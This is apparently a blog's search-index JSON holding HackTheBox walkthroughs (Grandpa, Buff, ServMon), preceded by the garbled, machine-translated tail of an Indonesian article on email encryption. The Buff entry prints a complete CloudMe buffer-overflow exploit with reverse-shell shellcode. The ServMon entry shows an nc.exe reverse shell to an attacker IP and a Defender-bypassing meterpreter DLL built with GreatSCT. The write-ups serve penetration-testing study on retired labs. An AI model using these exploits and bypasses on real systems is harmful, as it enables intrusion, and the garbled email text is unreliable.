kamu. Ini berarti bahwa mereka dapat menerjemahkannya, membuat dan membaca lebih mudah bagi penyerang. Metadata header hidingMetadata header hiding tidak langsung menutupi header dengan metadata jika sistem email harian kamu mengotentikasi email kamu. Ini juga mencakup akun email, laptop, browser, dan jaringan kamu, serta penerima. Jangan menjadi komoditas.Jika email kamu bagus dan gratis untuk digunakan, mungkin ada beberapa kemungkinan bahwa kamu diperlakukan sebagai komoditas. Namun, sangat sedikit user yang menyadari bahwa Gmail terus-menerus mencari kata-kata di inbox dan menggunakannya untuk menampilkan iklan yang disesuaikan. Dengan menggunakan cara ini, kamu membantu Google untuk mendapatkan uang dari data kamu dengan bantuan Gmail. Di tempat ramah informasi pribadi, simpan email kamu.Amerika Serikat dan negara berbagi kemampuan kognitif mana pun dengan Fourteen Eyes suatu hari nanti akan ingin mengakses inbox kamu. Jika database vendor ada di salah satu negara tersebut, akan jauh lebih cepat untuk melakukannya daripada mendapatkan akses ke bunker nuklir Swiss mana pun. Pada akhirnya, harap diingat bahwa sistem email sama terlindunginya dengan kata sandi yang kamu punya. Jika seseorang dapat meretas kata sandi kamu dalam beberapa menit, semua end-to-end autentikasi dan peraturan tanpa pencatatan akan diterapkan.dengan layanan email yang amanEnd-to-end autentikasi adalah karakteristik yang membedakan dari pesan terenkripsi. bahwa tidak ada pilihan untuk layanan atau pihak ketiga untuk memecahkan code pesan kamu, yang hanya dapat di peroleh oleh penerima. Di konter, pesan kamu dapat dibaca oleh penyedia layanan email standar seperti Google (mereka sudah menyaring email untuk kata-kata!) dan membuatnya lebih mudah didapat oleh penyerang.Untuk perlindungan, Pretty Good Privacy (PGP) dan Secure/multipurpose internet mail extension (S/MIME) adalah opsi yang paling menonjol. PGP menggabungkan perlindungan simetris dan asimetris, sedangkan S/MIME memberikan sertifikat yang harus disetujui oleh otoritas sertifikasi di tingkat regional atau publik. Memanfaatkan sertifikat menjamin bahwa kamu adalah penyedia pesan dan tidak diganggu oleh orang lain.Karena enkripsi, baik pelaku maupun pemerintah, seperti akun email, tidak akan mengintip komunikasi atau metadata kamu.Tingkat EnkripsiDi sini, kita telah membahas beberapa jenis tingkat enkripsi yang digunakan untuk mengamankan email. Enkripsi tingkat transportasiOtentikasi tingkat transportasi menjamin bahwa email kamu bergerak dengan aman di seluruh jaringan, seperti yang telah dibahas sebelumnya. Lagi pula, penyedia akan melihat edisi yang tidak terenkripsi setelah muncul di server mereka, itu tidak akan cukup untuk memungkinkan transmisi email yang aman. Meskipun yang terakhir masih digunakan, keamanan lapisan Transport, adalah mitra dari lapisan socket Aman. Ini diconfigurasi untuk mengenkripsi email IMAP, SMTP serta protokol lain, seperti HTTP Hyper-text transfer protocolatau FTP File transfer protocol, di atas TCP (Transmission Control Protocol). Sayangnya, itu masih belum termasuk dalam semua sistem email. Untuk user yang sering, mungkin tidak jelas karena tidak ada kemampuan untuk menentukan kapan enkripsi tingkat transportasi berlaku saat menggunakan email, tidak seperti browser internet yang menampilkan kunci hijau atau ikon yang setara. End to end encryptEnd-to-end encryption berarti bahwa teks kamu tidak dapat didekripsi baik oleh penyedia layanan email maupun pihak ketiga lainnya. Hanya pengirim dan penerima yang berisi public key dan privat yang diperlukan untuk membukanya. cara Kerja end-to-end encryptkamu menyandikan teks dengan public key dengan pacar kamu. Sekarang, hanya dapat di decodekan dengan private key dengan pacar kamu. Sebelum mengenai pacar kamu, data kamu yang disandikan melewati server. Dia menggunakan private key untuk memecahkan code pesan kamu sebagai gantinya. PGP email encryptUser tidak perlu membagikan private key; Otentikasi email PGP menggabungkan algoritma hashing, enkripsi simetris dan otentikasi public key. Di balik ini, sistem email yang melakukannya, jadi kamu tidak perlu memikirkan pro dan kontra. Bagaimana PGP bekerjaTepat setelah session key dibuat oleh protokol Privasi, penerima mengcodekannya. Pengirim memberikan session key yang disandikan dan didekripsi dengan private keynya oleh penerima.Pada akhirnya, session key yang tidak dienkripsi digunakan oleh penerima untuk membaca email." }, { "title": "HackTheBox - Grandpa", "url": "/htb-grandpa/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "Microsoft IIS, WebDav, davtest, metasploit, meterpreter, suggester, MS14-070, htb-windows-easy, writeup, oscp-prep", "date": "2021-10-23 00:34:46 +0700", "snippet": "HTB is an excellent platform that hosts machines belonging to multiple OS. It also has some other challenges as well. Individuals have to solve the puzzle (simple enumeration plus pentest) in order to log into the platform and download the VPN pack to connect to the machines hosted on the HTB platform.Today we are going to solve another CTF challenge Grandpa which is lab presented by Hack the Box for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB has two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Grandpa Lab.EnumerationAs usual, we’ll start by running the AutoRecon recon tool by Tib3rius on Grandpa. I highly recommend this tool to save time on CTF exams and practice. Navigate to the folder you downloaded and run the python script with our target IP. We will then go into our folder with the scan results completed and see the output of Nmap where we can start formulating theory for our exploit phase.cd AutoRecon./autorecon.py 10.10.10.14cd AutoRecon/results/10.10.10.14/scansIf you wish to scan Grandpa without AutoRecon, I would recommend the below nmap scan which will achieve the same results without the subscripts.nmap scanThe only open port is port 80, running Microsoft IIS 6.0$ nmap -sU -oN UDP-scan.txt 10.10.10.14 &amp;amp;Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 21:55 CESTNmap scan report for 10.10.10.14Host is up (0.10s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 6.0| http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH|_http-server-header: Microsoft-IIS/6.0|_http-title: Under Construction| http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH| Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK| Server Date: Fri, 13 Aug 2021 20:19:10 GMT| WebDAV type: Unknown|_ Server Type: Microsoft-IIS/6.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsI decided to perform an agressive scan and look for vulnerabilities with nmap`:$ nmap -vvv --script vuln -oN vuln-scan.txt 10.10.10.14PORT STATE SERVICE REASON80/tcp open http syn-ack ttl 127|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.| http-enum: | /postinfo.html: Frontpage file or folder| /_vti_bin/_vti_aut/author.dll: Frontpage file or folder| /_vti_bin/_vti_aut/author.exe: Frontpage file or folder| /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder| /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder| /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder| /_vti_bin/shtml.dll: Frontpage file or folder|_ /_vti_bin/shtml.exe: Frontpage file or folder| http-frontpage-login: | VULNERABLE:| Frontpage extension anonymous login| State: VULNERABLE| Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.| | References:|_ http://insecure.org/sploits/Microsoft.frontpage.insecurities.html|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=&amp;lt;path&amp;gt;Port 80 (Microsoft IIS 6.0)Microsoft IIS 6.0 is for Windows Server 2003:gobusterGobuster is a tool used to brute-force URI including directories and files as well as DNS.$ gobuster dir -u http://10.10.10.14 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt -o services/80-http.txt===============================================================/Images (Status: 301) [Size: 149] [--&amp;gt; http://10.10.10.14/Images/]/_private (Status: 403) [Size: 1529]/_vti_bin (Status: 301) [Size: 155] [--&amp;gt; http://10.10.10.14/%5Fvti%5Fbin/]/_vti_cnf (Status: 403) [Size: 1529]/_vti_bin/shtml.dll (Status: 200) [Size: 96]/_vti_log (Status: 403) [Size: 1529]/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]/_vti_pvt (Status: 403) [Size: 1529]/_vti_txt (Status: 403) [Size: 1529]/aspnet_client (Status: 403) [Size: 218]/images (Status: 301) [Size: 149] [--&amp;gt; http://10.10.10.14/images/]===============================================================nikto$ nikto -h $TARGET -output services/80-nikto.txt- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.10.14+ Target Hostname: 10.10.10.14+ Target Port: 80+ Start Time: 2021-10-23 22:11:52 (GMT2)---------------------------------------------------------------------------+ Server: Microsoft-IIS/6.0+ Retrieved microsoftofficewebserver header: 5.0_Pub+ Retrieved x-powered-by header: ASP.NET+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ Uncommon header &#39;microsoftofficewebserver&#39; found, with contents: 5.0_Pub+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Retrieved x-aspnet-version header: 1.1.4322+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Retrieved dasl header: &amp;lt;DAV:sql&amp;gt;+ Retrieved dav header: 1, 2+ Retrieved ms-author-via header: MS-FP/4.0,DAV+ Uncommon header &#39;ms-author-via&#39; found, with contents: MS-FP/4.0,DAV+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.+ OSVDB-5647: HTTP method (&#39;Allow&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method (&#39;Public&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.+ OSVDB-397: HTTP method (&#39;Public&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.+ OSVDB-5647: HTTP method (&#39;Public&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.+ WebDAV enabled (PROPPATCH COPY UNLOCK MKCOL PROPFIND LOCK SEARCH listed as allowed)+ OSVDB-13431: PROPFIND HTTP verb may show the server&#39;s internal IP address: http://10.10.10.14/+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST./_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host+ End Time: 2021-10-23 22:28:53 (GMT2) (1021 seconds)---------------------------------------------------------------------------+ 1 host(s) testeddavtestWe saw earlier from the nmap scan that the target server is using the WebDav protocol and HTTP PUT method is allowed. This could potentially give us the ability to upload files.We can check that with davtest:$ davtest --url http://$TARGET******************************************************** Testing DAV connectionOPEN SUCCEED: http://10.10.10.14********************************************************NOTE Random string for this session: XVHfy6LGFmkc******************************************************** Creating directoryMKCOL FAIL******************************************************** Sending test filesPUT pl FAILPUT cgi FAILPUT shtml FAILPUT php FAILPUT txt FAILPUT jsp FAILPUT jhtml FAILPUT html FAILPUT asp FAILPUT cfm FAILPUT aspx FAIL********************************************************/usr/bin/davtest Summary:Unfortunately, all tests failed.ExploitationAssembling the pieces together, we can look for exploits using metasploit:Let’s try this exploit on the web server:Nice! Now let’s try post/multi/recon/local_exploit_suggester:The target appears to be vulnerable to multiple exploits.Let’s migrate to another process before and then run the exploit:BOUM! We are SYSTEM! This machine was a piece of cake, it was predictable because it’s a very old server with known vulnerabilities that had patches available." }, { "title": "HackTheBox - Buff", "url": "/htb-buff/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "Gym Management System, searchsploit, nc.exe, port forwarding, chisel, buffer overflow, pwn, msfvenom, shellcode, htb-windows-easy, writeup, oscp-prep", "date": "2021-10-18 06:49:17 +0700", "snippet": "Buff is a very nice OSCP style box, where I have to identify the web software running on the site, and exploit it using public exploits to get execution via webshell. For privesc, I’ll find another service I can exploit using public exploits. I’m going to build with my own shell code to create my own shell, and set up the service so that I can connect just by listening on localhost. From there, the exploit script returns an administrator’s shell. In Beyond Root, I’ll go through the first script and do the exploit manually, and see how Defender blocks some of my attemptsEnumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Buff-full-port-scan.txt 10.10.10.198Nmap scan report for 10.10.10.198Host is up (0.18s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION7680/tcp open pando-pub?8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6|_http-title: mrb3n&#39;s Bro HutPort 8080 (HTTP)Visiting port 8080 shows us a web page about fitness.The /contact.php page discloses that Gym Management Software is being used.Using searchsploit we identified a potential exploit.FootholdThe exploit mimics a shell and allows us to send remote command.We can upgrade our shell to a more stable shell by uploading nc.exe and executing it:$ locate nc.exe/opt/SecLists/Web-Shells/FuzzDB/nc.exe/usr/share/seclists/Web-Shells/FuzzDB/nc.exe/usr/share/sqlninja/apps/nc.exe/usr/share/windows-resources/binaries/nc.exe$ cp /usr/share/windows-resources/binaries/nc.exe .PrivescUsing winPEAS we can see that there is an app called CloudMe which is running on local port 8888 but is not running on remote port.Plus, if we look at C:\\Users\\shaun\\Downloads\\, we can find a binary file called CloudMe_1112.exe:PS C:\\Users\\shaun\\Downloads&amp;gt; dirdir Directory: C:\\Users\\shaun\\DownloadsMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 16/06/2020 16:26 17830824 CloudMe_1112.exe In order to transfer it to our local machine, we can take advantage of the current web server:C:\\Users\\shaun\\Downloads&amp;gt;copy CloudMe_1112.exe C:\\xampp\\htdocs\\gym\\ copy CloudMe_1112.exe C:\\xampp\\htdocs\\gym\\ 1 file(s) copied. Note: following Stack-Based Buffer Overflows on Windows x86 course on Academy will guide you on writing an exploit for this program.Port forwarding with chiselCloudMe is listening only on localhost.If we want to make this port available to our machine, we can use a SOCKS proxy such as Chisel. Go to the release page and download the last executables for windows and linux amd64. First, on our Kali machine, we have to set up the Chisel server, listening on any port (here 9999): $ /chisel_1.7.6_linux_amd64 server -p 9999 --reverse 2021/09/07 00:09:35 server: Reverse tunnelling enabled 2021/09/07 00:09:35 server: Fingerprint EFwUZIpNMK9gCrrI3aubBlSlDShKhEzk0ophq0C08S4= 2021/09/07 00:09:35 server: Listening on http://0.0.0.0:9999 Then, on the target machine, tunel the port 8888 to our machine: C:\\&amp;gt;.\\chisel.exe client 10.10.14.12:9999 R:8888:127.0.0.1:8888 .\\chisel.exe client 10.10.14.12:9999 R:8888:127.0.0.1:8888 2021/09/06 23:17:24 client: Connecting to ws://10.10.14.12:9999 2021/09/06 23:17:26 client: Connected (Latency 188.0315ms) ExploitationLooking for CloudMe with searchsploit, we can find multiple exploits:The first one will worked just fine but we have to replace the shellcode. msfvenom can help us to do that:$ msfvenom -p windows/shell_reverse_tcp LHOST=$(vpnip) LPORT=4444 EXITFUNC=thread -b &quot;\\x00\\x0d\\x0a&quot; -f python --var-name payloadThen we can edit the exploit source file as follows:# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)# Date: 2020-04-27# Exploit Author: Andy Bowden# Vendor Homepage: https://www.cloudme.com/en# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe# Version: CloudMe 1.11.2# Tested on: Windows 10 x86#Instructions:# Start the CloudMe service and run the script.import socketimport systarget = &quot;127.0.0.1&quot;padding1 = b&quot;\\x90&quot; * 1052EIP = b&quot;\\xB5\\x42\\xA8\\x68&quot; # 0x68A842B5 -&amp;gt; PUSH ESP, RETNOPS = b&quot;\\x90&quot; * 30# msfvenom -p windows/shell_reverse_tcp LHOST=$(vpnip) LPORT=4444 EXITFUNC=thread -b &quot;\\x00\\x0d\\x0a&quot; -f python --var-name payloadpayload = b&quot;&quot;payload += b&quot;\\xb8\\x45\\x01\\x16\\x38\\xd9\\xed\\xd9\\x74\\x24\\xf4\\x5f&quot;payload += b&quot;\\x33\\xc9\\xb1\\x52\\x83\\xef\\xfc\\x31\\x47\\x0e\\x03\\x02&quot;payload += b&quot;\\x0f\\xf4\\xcd\\x70\\xe7\\x7a\\x2d\\x88\\xf8\\x1a\\xa7\\x6d&quot;payload += b&quot;\\xc9\\x1a\\xd3\\xe6\\x7a\\xab\\x97\\xaa\\x76\\x40\\xf5\\x5e&quot;payload += b&quot;\\x0c\\x24\\xd2\\x51\\xa5\\x83\\x04\\x5c\\x36\\xbf\\x75\\xff&quot;payload += b&quot;\\xb4\\xc2\\xa9\\xdf\\x85\\x0c\\xbc\\x1e\\xc1\\x71\\x4d\\x72&quot;payload += b&quot;\\x9a\\xfe\\xe0\\x62\\xaf\\x4b\\x39\\x09\\xe3\\x5a\\x39\\xee&quot;payload += b&quot;\\xb4\\x5d\\x68\\xa1\\xcf\\x07\\xaa\\x40\\x03\\x3c\\xe3\\x5a&quot;payload += b&quot;\\x40\\x79\\xbd\\xd1\\xb2\\xf5\\x3c\\x33\\x8b\\xf6\\x93\\x7a&quot;payload += b&quot;\\x23\\x05\\xed\\xbb\\x84\\xf6\\x98\\xb5\\xf6\\x8b\\x9a\\x02&quot;payload += b&quot;\\x84\\x57\\x2e\\x90\\x2e\\x13\\x88\\x7c\\xce\\xf0\\x4f\\xf7&quot;payload += b&quot;\\xdc\\xbd\\x04\\x5f\\xc1\\x40\\xc8\\xd4\\xfd\\xc9\\xef\\x3a&quot;payload += b&quot;\\x74\\x89\\xcb\\x9e\\xdc\\x49\\x75\\x87\\xb8\\x3c\\x8a\\xd7&quot;payload += b&quot;\\x62\\xe0\\x2e\\x9c\\x8f\\xf5\\x42\\xff\\xc7\\x3a\\x6f\\xff&quot;payload += b&quot;\\x17\\x55\\xf8\\x8c\\x25\\xfa\\x52\\x1a\\x06\\x73\\x7d\\xdd&quot;payload += b&quot;\\x69\\xae\\x39\\x71\\x94\\x51\\x3a\\x58\\x53\\x05\\x6a\\xf2&quot;payload += b&quot;\\x72\\x26\\xe1\\x02\\x7a\\xf3\\xa6\\x52\\xd4\\xac\\x06\\x02&quot;payload += b&quot;\\x94\\x1c\\xef\\x48\\x1b\\x42\\x0f\\x73\\xf1\\xeb\\xba\\x8e&quot;payload += b&quot;\\x92\\x19\\x31\\x9e\\x6e\\x76\\x47\\x9e\\x7f\\xda\\xce\\x78&quot;payload += b&quot;\\x15\\xf2\\x86\\xd3\\x82\\x6b\\x83\\xaf\\x33\\x73\\x19\\xca&quot;payload += b&quot;\\x74\\xff\\xae\\x2b\\x3a\\x08\\xda\\x3f\\xab\\xf8\\x91\\x1d&quot;payload += b&quot;\\x7a\\x06\\x0c\\x09\\xe0\\x95\\xcb\\xc9\\x6f\\x86\\x43\\x9e&quot;payload += b&quot;\\x38\\x78\\x9a\\x4a\\xd5\\x23\\x34\\x68\\x24\\xb5\\x7f\\x28&quot;payload += b&quot;\\xf3\\x06\\x81\\xb1\\x76\\x32\\xa5\\xa1\\x4e\\xbb\\xe1\\x95&quot;payload += b&quot;\\x1e\\xea\\xbf\\x43\\xd9\\x44\\x0e\\x3d\\xb3\\x3b\\xd8\\xa9&quot;payload += b&quot;\\x42\\x70\\xdb\\xaf\\x4a\\x5d\\xad\\x4f\\xfa\\x08\\xe8\\x70&quot;payload += b&quot;\\x33\\xdd\\xfc\\x09\\x29\\x7d\\x02\\xc0\\xe9\\x9d\\xe1\\xc0&quot;payload += b&quot;\\x07\\x36\\xbc\\x81\\xa5\\x5b\\x3f\\x7c\\xe9\\x65\\xbc\\x74&quot;payload += b&quot;\\x92\\x91\\xdc\\xfd\\x97\\xde\\x5a\\xee\\xe5\\x4f\\x0f\\x10&quot;payload += b&quot;\\x59\\x6f\\x1a&quot;overrun = b&quot;C&quot; * (1500 - len(padding1 + NOPS + EIP + payload)) buf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf)except Exception as e: print(sys.exc_value)We forwarded the port 8888 of the target on ou port 8888, now we just have to run the exploit:Useful links Chisel" }, { "title": "HackTheBox - ServMon", "url": "/htb-servmon/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "ftp, NVMS-1000, LFI, crackmapexec, ssh port forwarding, port forwarding, NSClient++, GreatSCT.py, Bypassing Defender, htb-windows-easy, writeup, oscp-prep", "date": "2021-09-07 06:00:00 +0700", "snippet": "ServMon is an easy Windows box requiring two exploits. There is a hint in anonymous FTP about the location of the password list. I was able to use the directory traversal bug in the NVMS 1000 web instance that would allow me to leak those passwords, and use one of them over SSH to get the shell. Then I was able to get the local configuration for the NSClient++ web instance running on TCP 8443, and used those credentials plus another exploit to get the SYSTEM shell.Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN ServMon-full-port-scan.txt 10.10.10.184Warning: 10.10.10.184 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.10.184Host is up (0.097s latency).Not shown: 64161 closed ports, 1355 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_01-18-20 12:05PM &amp;lt;DIR&amp;gt; Users| ftp-syst: |_ SYST: Windows_NT22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)| 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)|_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)80/tcp open http| fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK| Content-type: text/html| Content-Length: 340| Connection: close| AuthInfo: | &amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt;| &amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;| &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;| window.location.href = &quot;Pages/login.htm&quot;;| &amp;lt;/script&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;/body&amp;gt;| &amp;lt;/html&amp;gt;| NULL: | HTTP/1.1 408 Request Timeout| Content-type: text/html| Content-Length: 0| Connection: close|_ AuthInfo:|_http-title: Site doesn&#39;t have a title (text/html).135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?5040/tcp open unknown5666/tcp open tcpwrapped6063/tcp open x11?6699/tcp open napster?7680/tcp open pando-pub?8443/tcp open ssl/https-alt| fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404| Content-Length: 18| Document not found| GetRequest: | HTTP/1.1 302| Content-Length: 0| Location: /index.html| iday|_ :Saturday| http-title: NSClient++|_Requested resource was /index.html| ssl-cert: Subject: commonName=localhost| Not valid before: 2020-01-14T13:24:20|_Not valid after: 2021-01-13T13:24:20|_ssl-date: TLS randomness does not represent time49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPCHost script results:|_clock-skew: 3m23s| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-09-07T10:52:14|_ start_date: N/APort 21 (FTP)nmap revealed that Anonymous FTP login is allowed.$ ftp $TARGETConnected to 10.10.10.184.220 Microsoft FTP ServiceName (10.10.10.184:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&amp;gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.01-18-20 12:05PM &amp;lt;DIR&amp;gt; Users226 Transfer complete.ftp&amp;gt; cd Users250 CWD command successful.ftp&amp;gt; dir200 PORT command successful.125 Data connection already open; Transfer starting.01-18-20 12:06PM &amp;lt;DIR&amp;gt; Nadine01-18-20 12:08PM &amp;lt;DIR&amp;gt; Nathan226 Transfer complete.ftp&amp;gt; There are two directories accessible via FTP: Nadine NathanEach of them contains a text file with sensible information: Nadine =&amp;gt; Confidential.txt Nathan =&amp;gt; Notes to do.txtAccording to these files, there is a Passwords.txt inside Nathan’s Desktop and an application called NVMS offers a public access while they plan to remove it.Port 80 (HTTP)On port 80, there is a a login page for the NVMS-1000 network surveillance software.After looking for exploits, we discover that it is vulnerable to LFI (CVE-2019-20085).Indeed and if we try to get the Windows/win.ini file, it shows up:Now as we saw while enumerating FTP, there is a Passwords.txt file in Nathan’s Desktop:It contains several passwords that we can use for brute-forcing/password spraying attacks: 1nsp3ctTh3Way2Mars! Th3r34r3To0M4nyTrait0r5! B3WithM30r4ga1n5tMe L1k3B1gBut7s@W0rk 0nly7h3y0unGWi11F0l10w IfH3s4b0Utg0t0H1sH0me Gr4etN3w5w17hMySk1Pa5$FootholdPassword sprayingSMB (port 445)$ crackmapexec smb $TARGET -u Users.txt -p Passwords.txt SSH (port 22)Gaining accessNadine’s password L1k3B1gBut7s@W0rk works for both SSH and SMB. Let’s get a shell:PrivescAfter basic enumeration, I couldn’t get so much:nadine@SERVMON C:\\Users\\Nadine\\Desktop&amp;gt;whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ==================================== =======SeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeUndockPrivilege Remove computer from docking station EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone Enablednadine@SERVMON C:\\Users\\Nadine\\Desktop&amp;gt;systeminfoERROR: Access deniednadine@SERVMON C:\\Users\\Nadine&amp;gt;.\\winPEASx64.exeThe system cannot execute the specified program.NSClient++We can take a look at NSClient++ source files (previously enumerated with nmap on port 8443).Because of the allowed hosts we cannot log in directly to the app:We need to create an SSH tunnel, so we can access it.Furthermore, we can enumerate the software version using its binary nscp.exe:nadine@SERVMON C:\\Program Files\\NSClient++&amp;gt;.\\nscp.exe --versionNSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64Port forwarding$ ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184And it worked:We can log in using the password we found in nsclient.ini: ew2x6SsGTxjRwXOTThis web app contains functionality to create scripts that can be executed in the context of NT AUTHORITY\\SYSTEM.ExploitationWe will upload nc.exe to the target machine and then try to gain a reverse shell by executing it through the web app.nadine@SERVMON C:\\Users\\Nadine\\Desktop&amp;gt;curl 10.10.14.12/nc.exe -o nc.exe % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 59392 100 59392 0 0 59392 0 0:00:01 --:--:-- 0:00:01 137knadine@SERVMON C:\\Users\\Nadine\\Desktop&amp;gt;echo C:\\Users\\Nadine\\Desktop\\nc.exe 10.10.14.12 443 -e cmd.exe &amp;gt; C:\\Temp\\shell.batnadine@SERVMON C:\\Users\\Nadine\\Desktop&amp;gt;type C:\\Temp\\shell.batC:\\Users\\Nadine\\Desktop\\nc.exe 10.10.14.12 443 -e cmd.exeGo to Settings &amp;gt; External Scripts &amp;gt; Scripts to add a new script as follows:Click on Changes, and Save Configuration:Click on Control, and Reload:Wait a little bit, log in again and go to Queries, your new command has been added:Click on it and Run… And we were stopped by Windows Defender Antivirus which keeps removing nc.exe !Bypassing Defender with GreatSCT.pyA solution to ocvercome this issue is to use GreatSCT to generate a malicious DLL:$ ./GreatSCT.py --ip 10.10.14.12 --port 443 -t bypass -p regsvcs/meterpreter/rev_tcp.py -o servThen we can run metasploit with the generated RC file:$ msfconsole -r /usr/share/greatsct-output/handlers/serv.rcAfter that, we have to transfer the serv.dll file using either scp or wget or whatever.Finally, we have to change C:\\Temp\\shell.bat’s content:nadine@SERVMON C:\\Temp&amp;gt; cmd /c &quot;echo C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe C:\\Temp\\serv.dll &amp;gt; C:\\Temp\\shell.bat&quot;Go to Console, run shell, and you’ll get this beautiful message: Meterpreter session 1 openedUseful links https://nvd.nist.gov/vuln/detail/CVE-2019-20085 https://eternallybored.org/misc/netcat/ GreatSCT" }, { "title": "HackTheBox - Forest", "url": "/htb-forest/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": 